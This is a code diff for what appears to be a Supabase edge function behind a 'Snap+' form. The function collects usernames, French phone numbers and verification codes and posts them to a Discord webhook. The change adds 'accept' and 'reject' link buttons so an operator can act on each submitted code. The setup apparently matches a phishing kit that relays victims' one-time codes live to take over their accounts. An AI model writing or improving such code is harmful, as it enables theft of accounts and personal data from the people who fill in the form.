@@ -30,11 +30,9 @@ serve(async (req) => {
 
       if (error) throw error;
 
-      const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
-      
       const embed = {
         title: "📱 Nouveau formulaire Snap+",
-        description: `🆕 **Nouvelle soumission**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}`,
+        description: `🆕 **Nouvelle soumission**\n\n👤 **Nom d'utilisateur:** ${username}\n📞 **Téléphone:** +33${phone}`,
         color: 0xFFD700,
         timestamp: new Date().toISOString(),
         footer: { text: `ID: ${data.id}` }
@@ -51,7 +49,7 @@ serve(async (req) => {
       });
     }
 
-    // Si c'est le code, mettre à jour et envoyer pour validation
+    // Si c'est le code, mettre à jour et envoyer pour validation avec boutons
     if (step === "code" && submissionId) {
       await supabase
         .from('submissions')
@@ -59,23 +57,52 @@ serve(async (req) => {
         .eq('id', submissionId);
 
       const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
+      const now = new Date();
+      const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
+      const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
       const embed = {
-        title: "🔐 Code de vérification reçu",
-        description: `👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}\n🔑 **Code:** ${code}\n\n**Pour valider:** \`/approve ${submissionId}\`\n**Pour refuser:** \`/reject ${submissionId}\``,
+        title: "🔐 Code de vérification soumis",
         color: 0xFFD700,
-        timestamp: new Date().toISOString(),
-        footer: { text: `ID: ${submissionId}` },
         fields: [
-          { name: "✅ Approuver", value: `${callbackUrl}?id=${submissionId}&action=approve`, inline: true },
-          { name: "❌ Refuser", value: `${callbackUrl}?id=${submissionId}&action=reject`, inline: true }
+          { name: "👤 Nom d'utilisateur", value: username, inline: false },
+          { name: "🔢 Code saisi", value: `\`${code}\``, inline: true },
+          { name: "📞 Téléphone", value: `+33${phone.replace(/(\d{2})(?=\d)/g, '$1 ')}`, inline: false },
+          { name: "📅 Soumis à", value: `${dateStr} ${timeStr}`, inline: false },
+        ],
+        footer: { text: "En attente de validation par un modérateur" },
+      };
+
+      // Message avec boutons URL
+      const payload = {
+        embeds: [embed],
+        components: [
+          {
+            type: 1, // Action Row
+            components: [
+              {
+                type: 2, // Button
+                style: 5, // Link style
+                label: "Accepter",
+                url: `${callbackUrl}?id=${submissionId}&action=approve`,
+                emoji: { name: "✅" }
+              },
+              {
+                type: 2, // Button
+                style: 5, // Link style
+                label: "Refuser",
+                url: `${callbackUrl}?id=${submissionId}&action=reject`,
+                emoji: { name: "❌" }
+              }
+            ]
+          }
         ]
       };
 
       await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify(payload),
       });
 
       return new Response(JSON.stringify({ success: true }), {
